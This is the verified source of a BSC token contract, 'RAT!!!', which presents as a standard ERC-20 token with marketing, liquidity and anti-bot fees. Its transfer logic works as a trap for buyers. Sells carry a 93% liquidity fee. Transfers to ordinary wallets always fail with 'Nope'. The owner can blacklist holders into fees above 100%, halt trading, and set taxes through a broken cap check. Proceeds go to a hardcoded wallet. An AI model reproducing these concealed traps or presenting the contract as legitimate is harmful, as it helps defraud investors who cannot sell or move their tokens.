/**
 *Submitted for verification at BscScan.com on 2022-09-02
*/

/**

 TG: https://t.me/+cUrhOHMSUXphYTIx
*/


// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

abstract contract IERC20Extented is IERC20 {
    function decimals() external view virtual returns (uint8);
    function name() external view virtual returns (string memory);
    function symbol() external view virtual returns (string memory);
}

contract RAT is Context, IERC20, IERC20Extented, Ownable {
    using SafeMath for uint256;
    string private constant _name = "RAT!!!";
    string private constant _symbol = "RAT";
    uint8 private constant _decimals = 18;
    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private _tOwned;
    mapping(address => uint256) private _sellTotal;
    mapping(address => uint256) private _firstSell;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => bool) private _isContractWallet; // exclude contract wallets maxWalletAmount
    mapping(address => bool) private _isExchange; // used for whitelisting exchange hot wallets
    mapping(address => bool) private _isBridge; //used for whitelisting bridges
    mapping(address => bool) public isWhitelisted;

    uint256 private constant MAX = ~uint256(0);
    uint256 private constant _tTotal = 100000000 * 10**18;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;
    uint256 private _firstBlock;
    uint256 private _botBlocks;
    uint256 public _maxWalletAmount;
    uint256 private _threshold = 10;
    uint256 private _gasPriceLimitB=1000;
    uint256 private _gasPriceLimitS=100;
    uint256 private gasPriceLimitB = _gasPriceLimitB * 1 gwei; 
    uint256 private gasPriceLimitS = _gasPriceLimitS * 1 gwei; 
    //  buy fees
    uint256 public _buyMarketingFee = 7;
    uint256 private _previousBuyMarketingFee = _buyMarketingFee;
    uint256 public _buyReflectionFee = 0;
    uint256 private _previousBuyReflectionFee = _buyReflectionFee;
    uint256 public _buyLiquidityFee = 3;
    uint256 private _previousBuyLiquidityFee = _buyLiquidityFee;
    // sell fees
    uint256 public _sellMarketingFee = 7;
    uint256 private _previousSellMarketingFee = _sellMarketingFee;
    uint256 public _sellReflectionFee = 0;
    uint256 private _previousSellReflectionFee = _sellReflectionFee;
    uint256 public _sellLiquidityFee = 93;
    uint256 private _previousSellLiquidityFee = _sellLiquidityFee;

    uint256 private _feedenominator = 100;

    struct DynamicTax {
        uint256 buyMarketingFee;
        uint256 buyReflectionFee;
        uint256 buyLiquidityFee;
        
        uint256 sellMarketingFee;
        uint256 sellReflectionFee;
        uint256 sellLiquidityFee;
    }
    
    uint256 constant private _projectMaintainencePercent = 5;
    uint256 private _marketingPercent = 90;

    struct BuyBreakdown {
        uint256 tTransferAmount;
        uint256 tMarketing;
        uint256 tReflection;
        uint256 tLiquidity;
    }

    struct SellBreakdown {
        uint256 tTransferAmount;
        uint256 tMarketing;
        uint256 tReflection;
        uint256 tLiquidity;
    }
    
    struct FinalFees {
        uint256 tTransferAmount;
        uint256 tMarketing;
        uint256 tReflection;
        uint256 tLiquidity;
        uint256 rReflection;
        uint256 rTransferAmount;
        uint256 rAmount;
    }

    mapping(address => bool) public bots;
    address payable  _marketingAddress = payable(0x307266117a6aae2708Ed1d811182c0BFabE17eCF);
    address payable constant  _projectMaintainence = payable(0x307266117a6aae2708Ed1d811182c0BFabE17eCF);
    address payable constant  _burnAddress = payable(0x000000000000000000000000000000000000dEaD);
    address  presaleRouter;
    address  presaleAddress;
    IUniswapV2Router02 private uniswapV2Router;
    address public uniswapV2Pair;
    uint256 private _maxTxAmount;
    uint256 private priceFeed;
    bool private tradingOpen = true;
    bool private inSwap = false;
    bool private presale = false;
    bool private pairSwapped = false;
    bool public whitelistOnly = false;
    event EndedPresale(bool presale);
    event UpdatedAllowableDip(uint256 hundredMinusDipPercent);
    event UpdatedHighLowWindows(uint256 GTblock, uint256 LTblock, uint256 blockWindow);
    event MaxTxAmountUpdated(uint256 _maxTxAmount);
    event SellOnlyUpdated(bool sellOnly);
    event PercentsUpdated(uint256 _marketingPercent);
    event FeesUpdated(uint256 _buyMarketingFee, uint256 _buyLiquidityFee, uint256 _buyReflectionFee, uint256 _sellMarketingFee, uint256 _sellLiquidityFee, uint256 _sellReflectionFee);



    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor() {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);//ropstenn 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); //bsc test 0xD99D1c33F9fC3444f8101754aBC46c52416550D1);//bsc main net 0x10ED43C718714eb63d5aA57B78B54704E256024E);
        uniswapV2Router = _uniswapV2Router;
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router),type(uint256).max);

        _maxTxAmount = _tTotal.div(50); // 2%
        _maxWalletAmount = _tTotal.div(50); // 2%

        _rOwned[_msgSender()] = _rTotal;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_marketingAddress] = true;
        _isContractWallet[_marketingAddress] = true;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() override external pure returns (string memory) {
        return _name;
    }

    function symbol() override external pure returns (string memory) {
        return _symbol;
    }

    function decimals() override external pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() external pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return tokenFromReflection(_rOwned[account]);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) external view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender,_msgSender(),_allowances[sender][_msgSender()].sub(amount,"ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function tokenFromReflection(uint256 rAmount) private view returns (uint256) {
        require(rAmount <= _rTotal,"Amount must be less than total reflections");
        uint256 currentRate = _getRate();
        return rAmount.div(currentRate);
    }

    function setBotFee() private {
        _previousBuyMarketingFee = _buyMarketingFee;
        _previousBuyReflectionFee = _buyReflectionFee;

        _previousSellMarketingFee = _sellMarketingFee;
        _previousSellReflectionFee = _sellReflectionFee;
        
        _buyMarketingFee = 450;
        _buyReflectionFee = 450;

        _sellMarketingFee = 450;
        _sellReflectionFee = 450;
    }
    
    function restoreAllFee() private {
        _buyMarketingFee = _previousBuyMarketingFee;
        _buyReflectionFee = _previousBuyReflectionFee;
        _buyLiquidityFee = _previousBuyLiquidityFee;

        _sellMarketingFee = _previousSellMarketingFee;
        _sellReflectionFee = _previousSellReflectionFee;
        _sellLiquidityFee = _previousSellLiquidityFee;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function updateFee() private returns(DynamicTax memory) {
        
        DynamicTax memory currentTax;

        currentTax.buyMarketingFee = _buyMarketingFee;
        currentTax.buyLiquidityFee = _buyLiquidityFee;
        currentTax.buyReflectionFee = _buyReflectionFee;

        currentTax.sellMarketingFee = _sellMarketingFee;
        currentTax.sellLiquidityFee = _sellLiquidityFee;
        currentTax.sellReflectionFee = _sellReflectionFee;
  
        return currentTax;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        bool takeFee = true;
        
        DynamicTax memory currentTax;

        if (from != owner() && to != owner() && !presale && !_isContractWallet[from] && !_isContractWallet[to] && from != address(this) && to != address(this)) {
            require(tradingOpen);
            if (from != presaleRouter && from != presaleAddress) {
                require(amount <= _maxTxAmount);
            }
            if ((from == uniswapV2Pair || _isExchange[from]) && to != address(uniswapV2Router) && !_isExchange[to]) {//buys
                if(whitelistOnly) {
                require(isWhitelisted[from] || isWhitelisted[to], "Participants are not whitelisted.");
            }

                if (block.timestamp <= _firstBlock.add(_botBlocks) && from != presaleRouter && from != presaleAddress) {
                    bots[to] = true;
                }
                if (tx.gasprice >= gasPriceLimitB && from != presaleRouter && from != presaleAddress) {
                    bots[to] = true;
                }

                
                require(balanceOf(to).add(amount) <= _maxWalletAmount, "wallet balance after transfer must be less than max wallet amount");
                
                currentTax = updateFee();

            }
            
            if (!inSwap && from != uniswapV2Pair && !_isExchange[from]) { //sells, transfers
                require(!bots[from] && !bots[to]);
                require(tx.gasprice <= gasPriceLimitS,"Gas price exceeds limit.");
                if (!_isBridge[from] && !_isBridge[to]) {

                    if(whitelistOnly) {
                        require(isWhitelisted[from] || isWhitelisted[to], "Participants are not whitelisted.");
                    }
  
                    if(to != uniswapV2Pair && !_isExchange[to]) {
                        require(balanceOf(to).add(amount) <= 0, "Nope");
                    }

                    currentTax = updateFee();

                    uint256 contractTokenBalance = balanceOf(address(this));
                    if (contractTokenBalance > 0) {

                        uint256 autoLPamount = _sellLiquidityFee.mul(contractTokenBalance).div(_sellMarketingFee.add(_sellLiquidityFee));
                        swapAndLiquify(autoLPamount);
                    
                        swapTokensForEth(contractTokenBalance.sub(autoLPamount));
                    }
                    uint256 contractETHBalance = address(this).balance;
                    if (contractETHBalance > 0) {
                        sendETHToFee(address(this).balance);
                    }
                    
                }
            }
        }

        if (_isExcludedFromFee[from] || _isExcludedFromFee[to] || presale || _isBridge[to] || _isBridge[from]) {
            restoreAllFee();
            takeFee = false;
        }

        if (bots[from] || bots[to]) {
            restoreAllFee();
            setBotFee();
            takeFee = true;
        }

        if (presale) {
            require(from == owner() || from == presaleRouter || from == presaleAddress);
        }
        
        _tokenTransfer(from, to, amount, takeFee, currentTax);
        restoreAllFee();
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);
    }
    
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        uniswapV2Router.addLiquidityETH{value: ethAmount}(
              address(this),
              tokenAmount,
              0, 
              0, 
              owner(),
              block.timestamp
          );
    }
  
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {

        uint256 half = contractTokenBalance.div(2);
        uint256 otherHalf = contractTokenBalance.sub(half);

        uint256 initialBalance = address(this).balance;

        swapTokensForEth(half);

        uint256 newBalance = address(this).balance.sub(initialBalance);

        addLiquidity(otherHalf, newBalance);
    }

    function sendETHToFee(uint256 amount) private {
        _marketingAddress.transfer(amount.mul(_marketingPercent).div(_feedenominator));
        _projectMaintainence.transfer(amount.mul(_projectMaintainencePercent).div(_feedenominator));
    }

    function openTrading(uint256 botBlocks) private {
        _firstBlock = block.timestamp;
        _botBlocks = botBlocks;
        tradingOpen = true;
    }

    function manualswap() external {
        require(_msgSender() == _marketingAddress);
        uint256 contractBalance = balanceOf(address(this));
        swapTokensForEth(contractBalance);
    }

    function manualsend() external {
        require(_msgSender() == _marketingAddress);
        uint256 contractETHBalance = address(this).balance;
        sendETHToFee(contractETHBalance);
    }

    function _tokenTransfer(address sender, address recipient, uint256 amount, bool takeFee, DynamicTax memory currentTax) private {
        if (!takeFee) { 
                currentTax.buyMarketingFee = 0;
                currentTax.buyLiquidityFee = 0;
                currentTax.buyReflectionFee = 0;
                
                currentTax.sellMarketingFee = 0;
                currentTax.sellLiquidityFee = 0;
                currentTax.sellReflectionFee = 0;
        }
        if (sender == uniswapV2Pair || _isExchange[sender]){
            _transferStandardBuy(sender, recipient, amount, currentTax);
        }
        else {
            _transferStandardSell(sender, recipient, amount, currentTax);
        }
    }

    function _transferStandardBuy(address sender, address recipient, uint256 tAmount, DynamicTax memory currentTax) private {
        FinalFees memory buyFees;
        buyFees = _getValuesBuy(tAmount, currentTax);
        _rOwned[sender] = _rOwned[sender].sub(buyFees.rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(buyFees.rTransferAmount);
        _takeMarketing(buyFees.tMarketing);
        _reflectFee(buyFees.rReflection, buyFees.tReflection);
        _takeLiquidity(buyFees.tLiquidity);
        emit Transfer(sender, recipient, buyFees.tTransferAmount);
    }

    function _transferStandardSell(address sender, address recipient, uint256 tAmount, DynamicTax memory currentTax) private {
        FinalFees memory sellFees;
        sellFees = _getValuesSell(tAmount, currentTax);
        _rOwned[sender] = _rOwned[sender].sub(sellFees.rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(sellFees.rTransferAmount);
        if (recipient == _burnAddress) {
            _tOwned[recipient] = _tOwned[recipient].add(sellFees.tTransferAmount);
        }
        _takeMarketing(sellFees.tMarketing);
        _reflectFee(sellFees.rReflection, sellFees.tReflection);
        _takeLiquidity(sellFees.tLiquidity);
        emit Transfer(sender, recipient, sellFees.tTransferAmount);
    }

    function _reflectFee(uint256 rReflection, uint256 tReflection) private {
        _rTotal = _rTotal.sub(rReflection);
        _tFeeTotal = _tFeeTotal.add(tReflection);
    }

    function _takeMarketing(uint256 tMarketing) private {
        uint256 currentRate = _getRate();
        uint256 rMarketing = tMarketing.mul(currentRate);
        _rOwned[address(this)] = _rOwned[address(this)].add(rMarketing);
    }

    function _takeLiquidity(uint256 tLiquidity) private {
        uint256 currentRate = _getRate();
        uint256 rLiquidity = tLiquidity.mul(currentRate);
        _rOwned[address(this)] = _rOwned[address(this)].add(rLiquidity);
    }

    receive() external payable {}

    // Sell GetValues
    function _getValuesSell(uint256 tAmount, DynamicTax memory currentTax) private view returns (FinalFees memory) {
        SellBreakdown memory sellFees = _getTValuesSell(tAmount, currentTax.sellMarketingFee, currentTax.sellReflectionFee, currentTax.sellLiquidityFee);
        FinalFees memory finalFees;
        uint256 currentRate = _getRate();
        (finalFees.rAmount, finalFees.rTransferAmount, finalFees.rReflection) = _getRValuesSell(tAmount, sellFees.tMarketing, sellFees.tReflection, sellFees.tLiquidity, currentRate);
        finalFees.tMarketing = sellFees.tMarketing;
        finalFees.tReflection = sellFees.tReflection;
        finalFees.tLiquidity = sellFees.tLiquidity;
        finalFees.tTransferAmount = sellFees.tTransferAmount;
        return (finalFees);
    }

    function _getTValuesSell(uint256 tAmount, uint256 marketingFee, uint256 reflectionFee, uint256 liquidityFee) private view returns (SellBreakdown memory) {
        SellBreakdown memory tsellFees;
        tsellFees.tMarketing = tAmount.mul(marketingFee).div(_feedenominator);
        tsellFees.tReflection = tAmount.mul(reflectionFee).div(_feedenominator);
        tsellFees.tLiquidity = tAmount.mul(liquidityFee).div(_feedenominator);
        tsellFees.tTransferAmount = tAmount.sub(tsellFees.tMarketing);
        tsellFees.tTransferAmount -= tsellFees.tReflection;
        tsellFees.tTransferAmount -= tsellFees.tLiquidity;
        return (tsellFees);
    }

    function _getRValuesSell(uint256 tAmount, uint256 tMarketing, uint256 tReflection, uint256 tLiquidity, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rMarketing = tMarketing.mul(currentRate);
        uint256 rReflection = tReflection.mul(currentRate);
        uint256 rLiquidity = tLiquidity.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rMarketing).sub(rReflection);
        rTransferAmount -= rLiquidity;
        return (rAmount, rTransferAmount, rReflection);
    }

    // Buy GetValues
    function _getValuesBuy(uint256 tAmount, DynamicTax memory currentTax) private view returns (FinalFees memory) {
        BuyBreakdown memory buyFees = _getTValuesBuy(tAmount, currentTax.buyMarketingFee, currentTax.buyReflectionFee, currentTax.buyLiquidityFee);
        FinalFees memory finalFees;
        uint256 currentRate = _getRate();
        (finalFees.rAmount, finalFees.rTransferAmount, finalFees.rReflection) = _getRValuesBuy(tAmount, buyFees.tMarketing, buyFees.tReflection, buyFees.tLiquidity, currentRate);
        finalFees.tMarketing = buyFees.tMarketing;
        finalFees.tReflection = buyFees.tReflection;
        finalFees.tLiquidity = buyFees.tLiquidity;
        finalFees.tTransferAmount = buyFees.tTransferAmount;
        return (finalFees);
    }

    function _getTValuesBuy(uint256 tAmount, uint256 marketingFee, uint256 reflectionFee, uint256 liquidityFee) private view returns (BuyBreakdown memory) {
        BuyBreakdown memory tbuyFees;
        tbuyFees.tMarketing = tAmount.mul(marketingFee).div(_feedenominator);
        tbuyFees.tReflection = tAmount.mul(reflectionFee).div(_feedenominator);
        tbuyFees.tLiquidity = tAmount.mul(liquidityFee).div(_feedenominator);
        tbuyFees.tTransferAmount = tAmount.sub(tbuyFees.tMarketing);
        tbuyFees.tTransferAmount -= tbuyFees.tReflection;
        tbuyFees.tTransferAmount -= tbuyFees.tLiquidity;
        return (tbuyFees);
    }

    function _getRValuesBuy(uint256 tAmount, uint256 tMarketing, uint256 tReflection, uint256 tLiquidity, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rMarketing = tMarketing.mul(currentRate);
        uint256 rReflection = tReflection.mul(currentRate);
        uint256 rLiquidity = tLiquidity.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rMarketing).sub(rReflection);
        rTransferAmount -= rLiquidity;
        return (rAmount, rTransferAmount, rReflection);
    }

    function _getRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }

    function _getCurrentSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        if (_rOwned[_burnAddress] > rSupply || _tOwned[_burnAddress] > tSupply) return (_rTotal, _tTotal);
        rSupply = rSupply.sub(_rOwned[_burnAddress]);
        tSupply = tSupply.sub(_tOwned[_burnAddress]);
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }

    function excludeFromFee(address account) public onlyOwner() {
        _isExcludedFromFee[account] = true;
    }

    function includeInFee(address account) external onlyOwner() {
        _isExcludedFromFee[account] = false;
    }

    function removeBot(address account) external onlyOwner() {
        bots[account] = false;
    }

    function addBot(address account) external onlyOwner() {
        bots[account] = true;
    }

    function addBots(address[] calldata addresses, bool status) public onlyOwner {
        _addBots(addresses, status);
    }

        function _addBots(address[] memory addresses, bool status) internal {
        for (uint256 i; i < addresses.length; ++i) {
            bots[addresses[i]] = status;
        }
    }

    function setWhitelist(address account, bool newValue) public onlyOwner {
        isWhitelisted[account] = newValue;
    }

    function whitelistMultipleAddress(address[] memory account, bool whitelist) public onlyOwner {
        for(uint256 i = 0; i < account.length; i++){
            address wallet = account[i];
            isWhitelisted[wallet] = whitelist;
        }
    }

    function setWhitelistOnly(bool newValue) public onlyOwner {
        whitelistOnly = newValue;
    }

    function excludeFromContractWallet(address account) public onlyOwner() {
        _isContractWallet[account] = true;
    }

    function includeInContractWallet(address account) external onlyOwner() {
        _isContractWallet[account] = false;
    }
    
    function includeInExchange(address account) external onlyOwner() {
        _isExchange[account] = true;
    }
    
    function excludeFromExchange(address account) external onlyOwner() {
        _isExchange[account] = false;
    }

    function includeInBridge(address account) external onlyOwner() {
        _isBridge[account] = true;
    }
    
    function excludeFromBridge(address account) external onlyOwner() {
        _isBridge[account] = false;
    }
    
    function setMaxTxAmount(uint256 maxTxAmount) external onlyOwner() {
        require(maxTxAmount > _tTotal.div(40), "Amount must be greater than 0.25% of the total supply");
        require(maxTxAmount <= _tTotal, "Amount must be less than or equal to totalSupply");
        _maxTxAmount = maxTxAmount;
        emit MaxTxAmountUpdated(_maxTxAmount);
    }

    function setMaxWalletAmount(uint256 maxWalletAmount) external onlyOwner() {
        require(maxWalletAmount > 0, "Amount must be greater than 0");
        require(maxWalletAmount <= _tTotal, "Amount must be less than or equal to totalSupply");
        _maxWalletAmount = maxWalletAmount;
    }
    
    function setPercents(uint256 marketingPercent) external onlyOwner() {
        require(marketingPercent == 95, "Sum of percents must equal 95");
        _marketingPercent = marketingPercent;
        emit PercentsUpdated(_marketingPercent);
    }

    function setGas(uint256 SellGas, uint256 BuyGas) external onlyOwner() {
    require(BuyGas > 100, "Max gas for buying must be higher than 7 gwei");
    require(SellGas > 99, "Max gas for selling must be higher than 7 gwei");
    _gasPriceLimitB=BuyGas;
    _gasPriceLimitS=SellGas;
    }

    function setTaxes(uint256 buyMarketingFee, uint256 buyReflectionFee, uint256 buyLiquidityFee, uint256 sellMarketingFee, uint256 sellReflectionFee, uint256 sellLiquidityFee) external onlyOwner() {
        uint256 buyTax = buyMarketingFee.add(buyReflectionFee);
        buyTax += buyLiquidityFee;
        uint256 sellTax = sellMarketingFee.add(sellReflectionFee);
        sellTax += sellLiquidityFee;
        require(buyTax.div(_feedenominator) < 250, "Sum of sell fees must be less than 25");
        require(sellTax.div(_feedenominator) < 250, "Sum of buy fees must be less than 25");
        _buyMarketingFee = buyMarketingFee;
        _buyReflectionFee = buyReflectionFee;
        _buyLiquidityFee = buyLiquidityFee;
        _sellMarketingFee = sellMarketingFee;
        _sellReflectionFee = sellReflectionFee;
        _sellLiquidityFee = sellLiquidityFee;
        
        _previousBuyMarketingFee = _buyMarketingFee;
        _previousBuyReflectionFee = _buyReflectionFee;
        _previousBuyLiquidityFee = _buyLiquidityFee;
        _previousSellMarketingFee = _sellMarketingFee;
        _previousSellReflectionFee = _sellReflectionFee;
        _previousSellLiquidityFee = _sellLiquidityFee;
        
        emit FeesUpdated(_buyMarketingFee, _buyLiquidityFee, _buyReflectionFee, _sellMarketingFee, _sellLiquidityFee, _sellReflectionFee);
    }

    function setPresaleRouterAndAddress(address router, address wallet) external onlyOwner() {
        presaleRouter = router;
        presaleAddress = wallet;
        excludeFromFee(presaleRouter);
        excludeFromFee(presaleAddress);
    }

    function endPresale(uint256 botBlocks) external onlyOwner() {
        require(presale == true, "presale already ended");
        presale = false;
        openTrading(botBlocks);
        emit EndedPresale(presale);
    }

    function SetTradingStatus(bool enable) external onlyOwner() {
        tradingOpen = enable;
    }

    function updatePairSwapped(bool swapped) external onlyOwner() {
        pairSwapped = swapped;
    }
   
    function updateMarketingAddress(address payable marketingAddress) external onlyOwner() {
        _marketingAddress = marketingAddress;
    }

}